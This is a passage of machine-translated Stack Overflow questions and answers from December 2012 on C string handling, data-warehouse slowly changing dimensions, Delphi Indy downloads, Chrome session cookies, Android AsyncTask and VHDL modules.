  char text;
  val=genrandom(0,26);
  //  return val;
  text=letterize(val);
  printf("%c ,",text);//Replace %s with %c

}

char letterize(int num) { //No bound checking on num eh?
  char letter='A'+num;
  return letter;
} 
```

这就是我要说的。:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:44:14.523

为什么使用`%s`when `text`is `char`。您不需要函数中的字符串类型。只是一个字符就可以了。功能变化：`void randAlph ()`

```
printf("%s ,",text); 
```

至

```
printf("%c ,", text); 
```

# sql-server - DataWarehouse/Cube 中的半历史问题

> ID：13704129
> 
> 赞同：0
> 
> 时间：2012-12-04T13:32:49.170
> 
> 标签：sql-server, sql-server-2012, data-warehouse, business-intelligence, cube

我即将设计一个数据仓库和一个带有**产品维度**和**销售事实** 表的多维数据集。产品尺寸是*SCD（类型 2）*。

假设产品维度中的数据在第一年看起来像这样：

```
姓名 | 产品组 | 年
一个 | 一个 | 2011
乙| 一个 | 2011
C | 乙| 2011

```

第二年就像这样：

```
姓名 | 产品组 | 年
一个 | 一个 | 2012
乙| 乙| 2012
C | C | 2012

```

如您所见，一些产品在 2011 年至 2012 年期间更改了产品组。

在立方体中，我想问两种类型的问题：

*   **最简单的一个：** 2011 年我们在每个产品组中的销售额是多少。

*   **难点：**如果产品属于他们在 2012 年拥有的产品组，我们在 2011 年每个产品组的销售额是多少。

您将如何设计仓库和立方体来实现这一点？

谢谢！

附言。我正在使用 SQL Server 2012

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T18:32:46.487

这可以被视为 3 型 SCD。添加一列 [Product Group 2011] 可以回答这些类型的假设问题。

```
Name    |    Product Group  |  Product Group 2011  |    Year
A       |          A        |          A           |    2012
B       |          B        |          A           |    2012
C       |          C        |          B           |    2012 
```

另一种方法是为产品维度和销售事实添加一个[耐用的关键。](http://www.kimballgroup.com/2012/07/10/design-tip-147-durable-super-natural-keys/)

```
id | dur_id |    Name    |    Product Group  |    Year
1  |    1   |    A       |          A        |    2012
2  |    2   |    B       |          B        |    2012
3  |    3   |    C       |          C        |    2012
4  |    1   |    A       |          A        |    2012
5  |    2   |    B       |          B        |    2012
6  |    3   |    C       |          C        |    2012 
```

然后，您可以将 SALES 事实连接到 dur_id 上的 PRODUCT 维度，只需记住根据维度 Year 进行限制。

对于 SSAS，您可以加载“重复”事实行（即与 2011 关联的 2011 和 2012 事实行，并再次与 2012 关联）然后您需要将 2012 设为 [Year] 属性层次结构的默认成员，并且防止未指定年份的汇总。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T06:42:19.623

我在 msdn 的论坛上得到了很好的答案。

[http://social.msdn.microsoft.com/Forums/en-US/sqlanalysisservices/thread/96070b49-954a-456f-9687-3c8afaf74a39](http://social.msdn.microsoft.com/Forums/en-US/sqlanalysisservices/thread/96070b49-954a-456f-9687-3c8afaf74a39)

# c - FOR 循环时出现分段错误（核心转储）

> ID：13704134
> 
> 赞同：0
> 
> 时间：2012-12-04T13:33:07.237
> 
> 标签：c

这是C上的代码：

这是功能：

```
#include <stdio.h>
#include <stdlib.h>

struct worker
{
    char firstName;
    char lastName;
    char middleName;
    int age;
    float height;
};

void enterData();
void displayData();
void makeCalc();

struct worker *b;
int count;

int main(void)
{
    enterData();
    displayData();
    makeCalc();
    free(b);
    return 0;
}

void enterData()
{
    char firstName;
    char lastName;
    char middleName;
    int age;
    float height;

    printf("Количество работников: \n");
    scanf("%d", &count);

    if(count <= 0){
        exit(0);
    }

    b = (struct worker *)malloc(count*sizeof(struct worker));

    for(int i = 0; i<count; i++){
        printf("Введите имя, фамилию, отчестве, возраст и рост через пробел: \n");
        scanf("%s%s%s%d%f", &firstName, &lastName, &middleName, &age, &height);
        struct worker a = (struct worker) {firstName, lastName, middleName, age, height};
        b[i] = a;
    }

} 
```

如果显示程序，则在这部分运行时`Segmentation fault (core dumped)`：

```
for(int i = 0; i<count; i++){
            printf("Enter name, surname and middle name: \n");
            scanf("%s%s%s%d%f", &firstName, &lastName, &middleName, &age, &height);
            struct worker a = (struct worker) {firstName, lastName, middleName, age, height};
            b[i] = a; 
```

这可能是什么原因？我是 C 新手；

PS 我在 ubuntu 12.04 上使用 GCC 编译器。和通用的文本编辑器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:35:02.993

有你的问题：

```
 scanf("%s%s%s%d%f", &firstName, &lastName, &middleName, &age, &height); 
```

您扫描字符串，但您的变量只是字符：

```
 char firstName;
   char lastName;
   char middleName; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:35:40.240

我想你可能想为你的数据提供一个*缓冲区：*

```
char firstName[SOME_BIG_ENOUGH_SIZE]; 
```

而不是单个字符：

```
char firstName; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:36:28.310

问题是您在声明中使用 char 类型并`%s`在 scanf中使用

必须更改这些以保持字符串

```
 char firstName;
 char lastName;
 char middleName; 
```

应该改为

```
char firstName[MAX]; //where MAX is any convenient high value.
char lastName[MAX];
char middleName[MAX]; 
```

# android - 为 Phonegap/Titanium 跨平台开发选择硬件

> ID：13704136
> 
> 赞同：3
> 
> 时间：2012-12-04T13:33:26.917
> 
> 标签：android, ios, cordova, cross-platform, titanium

我是一名 iOS 编码员，并被要求使用 Phonegap 或 Titanium 编写一些跨平台代码。那里有很多关于设置开发环境等的信息......除了我错过了一个重要的信息。

我应该购买什么移动硬件？现在这是一个非常糟糕的 stackoverflow 问题，所以让我们重新表述它以使其有用。

在为 iOS/Android 跨平台开发使用 PhoneGap 或 Titanium 选择 Android 平板电脑时需要检查哪些标准？

推论的问题也很有用，在选择 iOS 硬件以使用 PhoneGap 或 Titanium 进行跨平台开发时需要检查哪些标准？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T21:10:09.713

一个好的通用方法是选择高容量设备，着眼于硬件多样化 - 例如，如果三星有一款非常高分辨率的手机，不要从 LG 购买另一款非常高分辨率的手机，或者如果所有可用的 Android 手机都是高分辨率的，尝试在具有滑出式键盘的情况下撒上一个。不要担心尝试在每台设备上测试所有内容，测试在少数设备上应该工作相同的东西，然后在大量设备上测试可能非常不同的东西。根据您的应用程序，您可能知道一些事情在不同设备上的行为可能会有所不同——关注这一点。例如，我们在所有设备上测试摄像头，但我们只会在一台设备上测试警报消息之类的东西。

如果您正在寻找为 iOS 和 Android 构建，我还建议您查看 Brightcove App Cloud - [http://appcloud.brightcove.com](http://appcloud.brightcove.com)。有很好的测试/调试工具和插件有据可查并得到充分支持。

# php - 在 centos 5.8 - 64 位上构建 freetype

> ID：13704137
> 
> 赞同：1
> 
> 时间：2012-12-04T13:33:31.010
> 
> 标签：php, gd, freetype, bzip

我正在尝试为 PHP 的 GD 模块构建 FreeType。好吧，我能够为 32 位 centos 成功构建它，但我在 x86_64 上遇到错误。

自由类型：

```
LDFLAGS="-L/usr/local/lib" CPPFLAGS="-I/usr/local/include" ./configure --prefix=/usr/local/ --enable-shared && make && make install 
```

压缩包：

```
make && make install PREFIX=/usr/local 
```

编译freetype时出错：

> /usr/bin/ld: /usr/local/lib/libbz2.a(bzlib.o): 重定位 R_X86_64_32S 反对 `a local symbol' 在制作共享对象时不能使用；使用 -fPIC 重新编译
> 
> /usr/local/lib/libbz2.a：无法读取符号：错误值 collect2：ld 返回 1 退出状态
> 
> 制作：*** [/setups/freetype-2.4.10/objs/libfreetype.la] 错误 1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T08:59:32.167

我可以通过使用 -fPIC 重新编译 bzip 来解决这个问题。我编辑了 Makefile。将线路更改`CC=gcc`为`CC=gcc -fPIC`

# delphi - 停止 idhttp.get 时的析构函数（indy，delphi）

> ID：13704139
> 
> 赞同：0
> 
> 时间：2012-12-04T13:33:44.707
> 
> 标签：delphi, destructor, terminate, disconnect, idhttp

我的应用程序可以从 memo1 中的每个 url 下载一张图片。它使用 idhttp.get 并有一个跳过按钮。跳过后下载下一张图片。

**Q1：你有代码要放入析构函数吗？“终止”和“等待”的代码是什么？** 我在另一个网站上找到了这个：

```
destructor thread.destroy;
begin
try
Terminate;
If HTTP.Connected then HTTP.Disconnect;
finally
WaitFor;
FreeAndNil(HTTP);
end;
inherited;
end; 
```

**Q2：如何调用析构函数并使其工作？**

**Q3：你有提示（尤其是安全问题）和额外的代码行吗？**

我的应用程序代码：

```
unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, IdBaseComponent, IdComponent, IdTCPConnection,
  IdTCPClient, IdHTTP;

type
       thread = class
  public
      Constructor Create; overload;
      Destructor  Destroy; override;
  end;

  TForm1 = class(TForm)
    IdHTTP1: TIdHTTP;
    Memo1: TMemo;
    Memo2: TMemo;
    Memo3: TMemo;
    startbutton: TButton;
    skipbutton: TButton;

    procedure startbuttonClick(Sender: TObject);
    procedure skipbuttonClick(Sender: TObject);
    procedure IdHTTP1Work(Sender: TObject; AWorkMode: TWorkMode;
      const AWorkCount: Integer);

         end;
var
  Form1: TForm1;
     http: tidhttp;
     s: boolean;
implementation

{$R *.dfm}

            constructor thread.Create;
begin
      HTTP := TIdHTTP.Create(nil);
      inherited ;
end;

           destructor thread.destroy;
begin
try

If HTTP.Connected then HTTP.Disconnect;
finally
FreeAndNil(HTTP);
end;
inherited;
end;

procedure TForm1.startbuttonClick(Sender: TObject);
var
i: integer;
  fs : TFileStream ;
begin
for i:= 0 to memo1.lines.count-1 do begin
s:= false;
   fs := TFileStream.Create(inttostr(i)+'abc.jpg', fmCreate);
   http:= idhttp1;
   try
   try
HTTP.Get(memo1.lines[i],fs);
memo2.Lines.add(memo1.Lines[i]);
except
on E: Exception do
begin
memo3.lines.add(' ha ha ha not working   '+syserrormessage(getlasterror));
end;
end;
finally
fs.free;
end;
end;

  end;

procedure TForm1.skipbuttonClick(Sender: TObject);
    begin
s:=true;
end;

procedure TForm1.IdHTTP1Work(Sender: TObject; AWorkMode: TWorkMode;
  const AWorkCount: Integer);
begin
application.ProcessMessages;

     if s = true then
http.Disconnect;

end;

end. 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T14:36:16.820

由于您`IdHttp`从 GUI（= 主线程）使用并且`Indy`是阻塞的，因此您有两个选择：a）`IdAntifreeze`与消息结合使用（只需将组件放在表单上），b）使用线程。

**不要**使用`Application.Processmessages`，因为它会导致奇怪的副作用。

现在回答你的问题：

**Q1**：您在互联网上找到的代码实现了解决方案 b）所以这不适用于您当前的代码

**Q2** : 与 Q1 相同

**Q3**：这是一个正确实现解决方案的版本 a)

这段代码仍然不是 100% 完美，因为它没有实现禁用/启用 starttransfer 和 skiptransfer 按钮的逻辑（我把它留给你作为练习:)）。

```
unit Unit16;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, IdAntiFreezeBase, IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient, IdHTTP;

const
  WM_TRANSFER = WM_USER + 1;

type
  TForm1 = class(TForm)
    IdHTTP1: TIdHTTP;
    IdAntiFreeze1: TIdAntiFreeze;
    Memo1: TMemo;
    Btn_start: TButton;
    Btn_skip: TButton;
    Memo2: TMemo;
    procedure IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
    procedure Btn_startClick(Sender: TObject);
    procedure Btn_skipClick(Sender: TObject);
  private
    { Private declarations }
    Transferring : Boolean;
    UrlIndex : Integer;
    procedure NextTransfer(var msg : TMessage); message WM_TRANSFER;
    procedure StartTransfer;
    procedure DoTransfer;
    procedure SkipTransfer;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
procedure TForm1.NextTransfer(var msg: TMessage);
begin
 DoTransfer;
end;

procedure TForm1.SkipTransfer;
begin
 Transferring := false;
end;

procedure TForm1.StartTransfer;
begin
 UrlIndex := 0;
 DoTransfer;
end;

procedure TForm1.DoTransfer;

var
  Url : String;
  Stream : TStringStream;

begin
 if UrlIndex < Memo1.Lines.Count then
  begin
   Url := Memo1.Lines[UrlIndex];
   Memo2.Lines.Add(Format('getting data from URL: %s', [Url]));
   Inc(UrlIndex);
   Transferring := True;
   try
    Stream := TStringStream.Create;
    try
     IdHttp1.Get(Url, Stream);
     Memo2.Lines.Add(Format('Data: "%s"',[Stream.DataString]));
    finally
     Stream.Free;
    end;
   except
    on E: Exception do
     begin
      Memo2.Lines.Add(Format('error during transfer: %s', [E.Message]));
     end;
   end;
   Transferring := False;
   PostMessage(Handle, WM_TRANSFER, 0, 0);
  end;
end;

procedure TForm1.Btn_startClick(Sender: TObject);
begin
 Memo2.Lines.Add('starting transfer');
 StartTransfer;
end;

procedure TForm1.Btn_skipClick(Sender: TObject);
begin
 Memo2.Lines.Add('skipping current transfer');
 SkipTransfer;
end;

procedure TForm1.IdHTTP1Work(ASender: TObject; AWorkMode: TWorkMode; AWorkCount: Int64);
begin
  Memo2.Lines.Add('work event');
 if not Transferring and (AWorkMode = wmRead) then
 try
  Memo2.Lines.Add('disconnecting peer');
  IdHttp1.Disconnect;
 except
 end;
end;

end. 
```

DFM 文件：

```
object Form1: TForm1
  Left = 0
  Top = 0
  Caption = 'Form1'
  ClientHeight = 290
  ClientWidth = 707
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  PixelsPerInch = 96
  TextHeight = 13
  object Memo1: TMemo
    Left = 92
    Top = 12
    Width = 213
    Height = 257
    Lines.Strings = (
      'http://stackoverflow.com'
      'http://www.google.com'
      'http://www.hardocp.com'
      '')
    TabOrder = 0
    WordWrap = False
  end
  object Btn_start: TButton
    Left = 8
    Top = 128
    Width = 75
    Height = 25
    Caption = 'Btn_start'
    TabOrder = 1
    OnClick = Btn_startClick
  end
  object Btn_skip: TButton
    Left = 8
    Top = 159
    Width = 75
    Height = 25
    Caption = 'Btn_skip'
    TabOrder = 2
    OnClick = Btn_skipClick
  end
  object Memo2: TMemo
    Left = 320
    Top = 12
    Width = 373
    Height = 257
    TabOrder = 3
    WordWrap = False
  end
  object IdHTTP1: TIdHTTP
    OnWork = IdHTTP1Work
    AllowCookies = True
    ProxyParams.BasicAuthentication = False
    ProxyParams.ProxyPort = 0
    Request.ContentLength = -1
    Request.ContentRangeEnd = -1
    Request.ContentRangeStart = -1
    Request.ContentRangeInstanceLength = -1
    Request.Accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    Request.BasicAuthentication = False
    Request.UserAgent = 'Mozilla/3.0 (compatible; Indy Library)'
    Request.Ranges.Units = 'bytes'
    Request.Ranges = <>
    HTTPOptions = [hoForceEncodeParams]
    Left = 24
    Top = 16
  end
  object IdAntiFreeze1: TIdAntiFreeze
    Left = 16
    Top = 72
  end
end 
```

# javascript - Javascript 在浏览器关闭时删除 cookie，即使它设置为在启动时恢复 cookie

> ID：13704141
> 
> 赞同：4
> 
> 时间：2012-12-04T13:33:46.487
> 
> 标签：javascript, cookies, browser, settings, session-cookies

我有一个烦人的问题，遍布整个互联网，但我找不到解决问题的具体方法。这里是：

在 Chrome 中，您可以在浏览器启动时选择“从上次中断的地方继续”。不幸的是，这意味着所有会话 cookie 都会在浏览器关闭和恢复或浏览器启动时保留。一旦浏览器关闭，我需要我的客户端（Javascript）应用程序来终止 cookie，但即使我没有设置到期日期也不会发生（因此 cookie 成为会话 cookie，即使 Chrome 也这么说浏览会话结束时过期）。问题是，即使我关闭浏览器或重新启动计算机，Chrome 也不会终止浏览会话，因为那个该死的启动设置。

一种方法是指定未来 15 分钟（或其他任何时间）的到期日期。在每次用户操作时，cookie 的到期日期都会刷新（重新创建 cookie）。如果用户不活动超过 15 分钟（或其他任何时间），cookie 就会消失。我无法承受让另一个人打开浏览器并发现自己处于前一个人的会话中的 15 分钟，而且我不能让当前用户在每次他上厕所后登录。所以我需要这个：用户登录，cookie被设置并一直持续到浏览器关闭。这是会话 cookie 的正常行为，但是……（上一段）。

我还考虑过在窗口 unload() 事件中删除 cookie，但是如果应用程序在多个选项卡中打开并且用户只关闭其中一个呢？我可以每秒轮询一次 cookie 的存在，并将 cookie 始终保存在 Javascript 变量中，然后如果用户关闭另一个选项卡，我可以每秒恢复一次 cookie（如果需要）。这将使 cookie 保持活动状态，直到我的应用程序的最后一个选项卡关闭，即浏览器退出。这是我目前最好的解决方案，但我讨厌它。

有没有人知道另一种（更清洁的）方法来实现同样的事情？有什么方法可以指定我不关心用户的启动设置的 Chrome（和/或其他浏览器），我的 cookie 应该在浏览器关闭时死掉？

我希望我有足够的意义:)

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:46:45.810

关键是这是一个*用户*选项。它不是应用程序选项。您的应用程序绝对没有任何业务试图解决它，并且应该将场景视为用户真的在同一个会话中。

# jquery - 关于 jQuery 选择器的不同浏览器行为

> ID：13704144
> 
> 赞同：3
> 
> 时间：2012-12-04T13:33:50.943
> 
> 标签：jquery, cross-browser, css-selectors

在正文中考虑以下 HTML5 代码：

```
<p id="p1">
    Email: <input type="text" name="email" /><br />
    Name: <input type="text" name="name" /><br />
    <input type="submit" name="submit" value="Submit" />
</p>
<p id="p2">
    <form action="/index.php">
        Email: <input type="text" name="email" /><br />
        Name: <input type="text" name="name" /><br />
        <input type="submit" name="submit" value="Submit" />
    </form>
</p> 
```

以及以下 javascript 代码：

```
$(document).ready(function() {
    alert("$(#p1 input).length: " + $("#p1 input").length + "\n$(#p2 input).length: " + $("#p2 input").length);
});​ 
```

以下是不同浏览器的输出：

**互联网浏览器 9.0.8112.16421**

```
$(#p1 input).length: 3
$(#p2 input).length: 3 
```

**铬版本 20.0.1132.47 Ubuntu 12.04 (144678)**

```
$(#p1 input).length: 3
$(#p2 input).length: 0 
```

**适用于 Ubuntu 17.0.1 的 Mozilla Firefox**

```
$(#p1 input).length: 3
$(#p2 input).length: 0 
```

谁能解释一下为什么？

[http://jsfiddle.net/LKStL/2/](http://jsfiddle.net/LKStL/2/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T13:47:05.923

详细说明我的评论：

`form`不允许在元素内部使用类似的块`p`元素。它是无效的 HTML，因此 jQuery 在尝试解析它时会中断。我只能推测它可能在 Internet Explorer 中工作，因为 Explorer 不遵循 HTML 呈现标准（即：它应该会中断但不会）。

**解决方案：**将您的`form`标签放在 之外`p`或更改`p`为允许块元素的元素，例如`div`.

# android - 使用 AsyncTask 的应用程序仍然占用 UI 线程？

> ID：13704146
> 
> 赞同：0
> 
> 时间：2012-12-04T13:33:53.163
> 
> 标签：android, android-intent, asynchronous, android-asynctask

我编写了一个位于“共享方式”菜单中的应用程序（用于快速通过电子邮件向自己发送指向我在网络上找到的内容或在 RSS 阅读器中查看的内容）为此，我使用了一个 intent.action.SEND 意图过滤器：

```
 <activity
        android:name="uk.co.baroquedub.checkit.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.SEND" />
            <category android:name="android.intent.category.DEFAULT" />
            <data android:mimeType="text/plain" />
           </intent-filter>
    </activity> 
```

这是 MainActivity 包，它从 Intent 中获取页面标题和 url，并使用单独的 GMailSender 类直接通过电子邮件向我发送此信息：

```
package uk.co.baroquedub.checkit;

import android.app.Activity;
import android.app.Dialog;
import android.content.Intent;

import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {

private static Dialog dialog;

String title;
String url;
String message;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent intent = getIntent();
    intent.setFlags( Intent.FLAG_ACTIVITY_CLEAR_TOP );
    String action = intent.getAction();

    // if this is from the share menu
   if (Intent.ACTION_SEND.equals(action)) {   
           title = intent.getStringExtra(Intent.EXTRA_SUBJECT);
           url = intent.getStringExtra(Intent.EXTRA_TEXT);

           // Flipboard fix (remove title in URL)
           url = url.replace(title, "");

           if (url != null){
            url = title+"\n"+url;
           } else {
            url = "error getting URL";
           }

    // Asynch Task
                doSendTask task = new doSendTask();
                task.execute(new String[] { url });   

   }

}

protected void showDialog (String response){
dialog = new Dialog(this);
    dialog.setContentView(R.layout.dialog);
    dialog.setTitle(response);

    Button button = (Button) dialog.findViewById(R.id.Button01);
    button.setOnClickListener(new View.OnClickListener() {  
        @Override  
        public void onClick(View view) {  

            dialog.dismiss();   
            finish();
        }  
    });

    dialog.show();
}

private class doSendTask extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... urls) {
      String response = "";

      String senderPassword = getResources().getString(R.string.senderPassword); 
      String senderEmail = getResources().getString(R.string.senderEmail); 
      String recipientEmail = getResources().getString(R.string.recipientEmail); 
      String subjectText = getResources().getString(R.string.subjectText);

      GMailSender sender = new GMailSender(senderEmail, senderPassword);
      try {
        sender.sendMail(subjectText,   
                url,   
                  senderEmail,   
                  recipientEmail);
            response = "Email sent";
        } catch (Exception e) {
            //Log.e("SendMail", e.getMessage(), e); 
            response = "Error sending email";
        }

      return response;
    }

    @Override
        protected void onPostExecute(String result) {
            showDialog(result);
    }
}

@Override
public void onDestroy() {
    super.onDestroy();

    /*
     * Kill application when the root activity is killed.
     */
    UIHelper.killApp(true);
}

} 
```

版本 1 运行良好，但我从“onCreate”中发送电子邮件，这意味着在“已发送电子邮件”通知出现之前，手机的浏览器将无响应（我无法滚动或导航到新页面）。然后我更改了代码（如上所述）以将电子邮件发送代码放在 AsyncTask 类中 - 但是尽管应用程序仍然可以工作，但浏览器仍然没有响应，直到出现对话框。AsyncTask 似乎没有任何区别。

谁能解释原因，并希望提出解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T16:54:31.040

**回答？**...我已经大大简化了上面的代码，试图找出可能出错的地方。我创建了一个沼泽标准应用程序并使用了以下内容：

```
package uk.co.baroquedub.testcheck;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;

import android.widget.Toast;

public class MainActivity extends Activity {

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    doSendTask task = new doSendTask();
    task.execute(new String[] { "urlString" });
}

protected void showDialog (String response){
    Toast.makeText(this, response, Toast.LENGTH_SHORT).show();
    finish();
}

private class doSendTask extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... urls) {
      String response = "";

      try { 
          Thread.sleep(5000);
          response = "Waited";
      }
      catch (InterruptedException ex) {  }

      return response;
    }

    @Override
        protected void onPostExecute(String result) {
            showDialog(result);
    }
}

} 
```

这让我看到出了什么问题：我的应用程序正在浏览器顶部打开（出现一个白色屏幕，标题栏显示应用程序的名称）我不知道我的正确应用程序（上图）因为我正在使用一个使用透明背景的主题。

请参阅：[问题演示的截屏视频](http://screencast.com/t/NbTOxcLJxu)

因此，尽管电子邮件是作为 AsyncTask 发送的，但在发生这种情况时，应用程序本身会出现在浏览器的顶部——这就是阻止它被访问的原因。（我将作为一个单独的问题发布关于此的帮助请求）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:58:17.240

我认为您的代码有错误：

```
 doSendTask task = new doSendTask();
 task.execute(url); // if you want to put more urls  task.execute(url,url1,url2);
 try {
        sender.sendMail(subjectText,   
                url[0],             // get the first url
                  senderEmail,   
                  recipientEmail);
            response = "Email sent";
        } catch (Exception e) {
            //Log.e("SendMail", e.getMessage(), e); 
            response = "Error sending email";
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:15:09.533

ASyncTask 确实是在他们自己的线程上执行的，正如他们的[参考页面](http://developer.android.com/reference/android/os/AsyncTask.html)所写的那样。

当您为此活动创建意图时，您传递标志'FLAG_ACTIVITY_CLEAR_TOP'，其内容类似于'......其上的所有其他活动都将关闭，并且此意图将被传递到（现在在顶部）旧活动作为新意图。这是否意味着旧的活动被锁定，直到这个新的活动终止？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:37:05.877

不，AsyncTask 不会绑定到您的 UI 线程，并且您不会像在`onCreate()`.

# java - 计算字符串的长度，不包括换行符

> ID：13704152
> 
> 赞同：-1
> 
> 时间：2012-12-04T13:34:38.437
> 
> 标签：java

我正在写出一个字符串，每次一行有 20 个字符时，我都需要它来换行。然而，它计算

```
\n 
```

作为一个角色也是如此。当行上有 20 个字符时，我如何换行，不包括 \n？

编辑：每次计算 20 个字符时，都会在行尾添加 \n

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:38:04.480

在打印你的字符串之前，去掉包含的换行符，如下所示：

```
yourString = yourString.replaceAll("\\n", ""); 
```

这`"\\n"`是一个匹配换行符的正则表达式。字符串文字`"\\n"`实际上是一个包含`\n`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:37:30.807

您可以首先找到并用空字符串替换所有出现的“\n”到您的源代码中，然后执行您的算法。

```
destinationSring = sourceString.replaceAll("\\n", ""); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:41:26.847

您可以使用以下

```
stringValue.replaceAll("[\n\r]+", "").length() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:45:00.013

```
int count=0;
for (char c : someString.toCharArray()) {
    if (c == '\n') continue;
    System.out.print(c);
    ++count;
    if (count % 20 == 0) System.out.println();    
} 
```

# vhdl - 开发多用途 VHDL 模块

> ID：13704153
> 
> 赞同：3
> 
> 时间：2012-12-04T13:34:39.480
> 
> 标签：vhdl

在多年没有接触过 VHDL 之后，我最近才重新开始学习 VHDL。希望用它来开发具有各种传感器接口等的控制系统。我在嵌入式 C 方面相当胜任，在此之前，这一直是我所从事的任何嵌入式项目的首选语言，这使得学习VHDL更加令人沮丧。

基本上，我现在的问题（我认为这是我能够推进我的预期项目的最大障碍）是我不知道如何开发和合并一个我可以将变量传递给并调用的模块（比如C) 中的函数来执行某些任务，*即在 4 位 7 段显示器上显示整数 0-9999*。我知道 VHDL 中有组件，但这似乎是一种执行一项任务的冗长方式。有没有更好的方法来做到这一点？

在我看来，在您完成所有数字教程之后，关于如何在 VHDL 中实际开发完整系统的信息存在巨大差距。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T15:18:51.400

编辑：进一步解释：底部的第三条评论。为这篇文章的长度道歉！

VHDL 也有函数和过程，就像 C if 语句、与 C 的 switch 有一些相似之处的 case 语句）等等。

到目前为止，这一切都是可以综合的；其他一些 VHDL 功能仅用于仿真（让您测试可综合代码）。因此，在模拟中，您可以像 C 一样打开、读取和写入文件，并使用指针（访问类型）来处理内存。我希望你能明白为什么 VHDL 的这些部分是不可综合的！）

但是 VHDL 的不同之处在于您需要一些额外的行来将这个顺序代码包装在一个进程中。在 C 中，这发生在你身上；一个典型的 C 程序只是一个进程（如果你想要多个进程，你必须求助于库或操作系统功能，如 fork 或 pthreads）

但是 VHDL 可以做得更多。您可以非常轻松地创建多个进程，将它们与信号互连，将它们包装为可重用的组件，使用“for ... generate”来创建多个进程，等等。同样，所有可综合：这施加了一些限制，例如，在系统运行时不能更改硬件的大小（进程数）！

关键：了解信号分配的规则，而不是变量分配。变量在 C 中的工作方式非常相似；信号不！相反，他们所做的是提供安全、同步的进程间通信，而不会大惊小怪。要了解如何，您需要了解“延迟分配”、增量周期、等待语句以及进程如何挂起自身并再次唤醒。

您似乎在这里问了两个问题：

(1) - 我可以使用 C 中的函数吗？非常如此；通过将有用的类型和相关函数、过程包装在一个包中并在多个设计中重用该包，您可以做得比 C 更好。它有点像 C++ 可重用类，有一些强点，也有一些弱点。

(2) 我可以在 VHDL 中完全避免实体、架构和组件吗？您可以避免使用组件（搜索“VHDL 直接实体实例化”），但在某些时候您将需要实体和架构。

您至少可以编写一个完成您的工作的进程，接收信号的输入（clk、count）并在其他信号上传输到 LED。

创建一个将所有这些信号作为端口的实体，以及一个包含您的进程的架构，将其信号连接到端口。这很容易——它只是样板文件。在 FPGA 上，您还需要定义这些端口与 LED 连接到的实际引脚之间的映射。合成它，你就完成了，对吧？.. 不完全的。

创建另一个没有外部端口的“测试台”实体。这将包含您的实体（直接实例化）、一组连接到其端口的信号，以及一个驱动实体输入端口并监视其输出端口的新进程。（最佳实践是让测试台自检，并在出现问题时断言！）通常“clk”来自它自己的单行进程，并为测试台和实体提供时钟。

现在，您可以模拟测试台并以您想要的任何详细程度观察您的设计是否正常工作（或不工作！）。当它起作用时 - 合成。

编辑以获取更多信息：re：组件、过程、功能。

实体/组件是主要工具（如果您愿意，您可以忽略组件，稍后我将处理实体）。

过程和函数通常在一个进程中协同工作。如果将它们重构为一个包，它们可以在其他志同道合的过程中重用（例如，对相同的数据类型进行操作）。一个常见的抽象是一个数据类型，加上在它上面操作的所有函数和过程，包装在一个包中——这有点类似于 C++ 类。函数在任何声明区域也有用途，作为初始化器（在软件术语中也称为“工厂”模式）

但主要工具是实体。

这是一个嵌入式 C 程序员可能不熟悉的级别，因为 C 基本上停留在进程级别。

如果您编写了一个像 SPI 主机这样的物理块，作为一个进程，您将把该进程包装在一个实体中。这将通过端口与世界其他地方进行通信（在实体内部，端口的行为类似于信号）。它可以通过泛型进行参数化（例如，对于内存大小，如果它是内存）。实体可以包装多个进程、其他实体和其他不完全适合进程的逻辑（例如，非时钟逻辑，进程被计时的地方）

要创建一个系统，您将在“结构 HDL 代码”（有用的搜索词！）中互连实体 - 可能是它们的整个层次结构 - 在顶级实体中。您通常会将其综合到 FPGA 中。

